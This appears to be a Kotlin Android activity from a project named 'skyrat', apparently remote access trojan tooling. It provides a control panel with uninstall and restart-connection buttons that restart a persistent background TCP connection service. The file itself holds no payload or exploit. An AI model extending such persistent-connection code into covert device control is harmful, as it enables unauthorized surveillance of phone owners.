package com.techsky.skyrat

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AlertDialog
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class ControlPanel : AppCompatActivity() {

    private lateinit var activity: Activity
    private lateinit var statusText: TextView
    private lateinit var restartButton: MaterialButton
    private lateinit var uninstallButton: MaterialButton

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_control_panel)
        activity = this

        initializeViews()
        initializeService()
        setupClickListeners()
        updateStatus()
    }

    private fun initializeViews() {
        statusText = findViewById(R.id.status_text)
        restartButton = findViewById(R.id.restart)
        uninstallButton = findViewById(R.id.uninstall)
    }

    private fun initializeService() {
        Functions(activity).jobScheduler(applicationContext)
    }

    private fun setupClickListeners() {
        uninstallButton.setOnClickListener {
            showUninstallConfirmation()
        }

        restartButton.setOnClickListener {
            showRestartConfirmation()
        }
    }

    private fun showUninstallConfirmation() {
        AlertDialog.Builder(this)
            .setTitle("Uninstall Application")
            .setMessage("Are you sure you want to uninstall this application? This action cannot be undone.")
            .setPositiveButton("Uninstall") { _, _ ->
                uninstallApp()
            }
            .setNegativeButton("Cancel", null)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .show()
    }

    private fun showRestartConfirmation() {
        AlertDialog.Builder(this)
            .setTitle("Restart Connection")
            .setMessage("This will restart the connection service. Continue?")
            .setPositiveButton("Restart") { _, _ ->
                restartConnection()
            }
            .setNegativeButton("Cancel", null)
            .setIcon(android.R.drawable.ic_menu_rotate)
            .show()
    }

    private fun uninstallApp() {
        try {
            updateStatus("Initiating uninstall...", "#E74C3C")

            val intent = Intent(Intent.ACTION_UNINSTALL_PACKAGE).apply {
                data = Uri.parse("package:${packageName}")
                putExtra(Intent.EXTRA_RETURN_RESULT, true)
            }
            startActivityForResult(intent, REQUEST_UNINSTALL)
        } catch (e: Exception) {
            updateStatus("Uninstall failed", "#E74C3C")
            e.printStackTrace()
        }
    }

    private fun restartConnection() {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                updateStatus("Restarting connection...", "#F39C12")

                // Stop current services
                stopService(Intent(applicationContext, MainService::class.java))

                withContext(Dispatchers.IO) {
                    // Small delay to ensure service stops
                    delay(2000)

                    // FIXED: Use BackgroundTcpManager instead of deleted TcpConnection
                    val backgroundManager = BackgroundTcpManager(applicationContext)
                    backgroundManager.startConnection()
                }

                // Restart service scheduler
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    Functions(activity).jobScheduler(applicationContext)
                } else {
                    startService(Intent(applicationContext, MainService::class.java))
                }

                updateStatus("Connection restarted", "#27AE60")

                // Auto-close after restart
                CoroutineScope(Dispatchers.Main).launch {
                    delay(2000)
                    finish()
                }

            } catch (e: Exception) {
                updateStatus("Restart failed", "#E74C3C")
                e.printStackTrace()
            }
        }
    }

    private fun updateStatus(message: String = "Service Running", color: String = "#27AE60") {
        runOnUiThread {
            statusText.text = message
            statusText.setTextColor(android.graphics.Color.parseColor(color))
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            REQUEST_UNINSTALL -> {
                if (resultCode == RESULT_OK) {
                    updateStatus("Uninstall completed", "#27AE60")
                } else {
                    updateStatus("Uninstall cancelled", "#F39C12")
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    companion object {
        private const val REQUEST_UNINSTALL = 1001
    }
}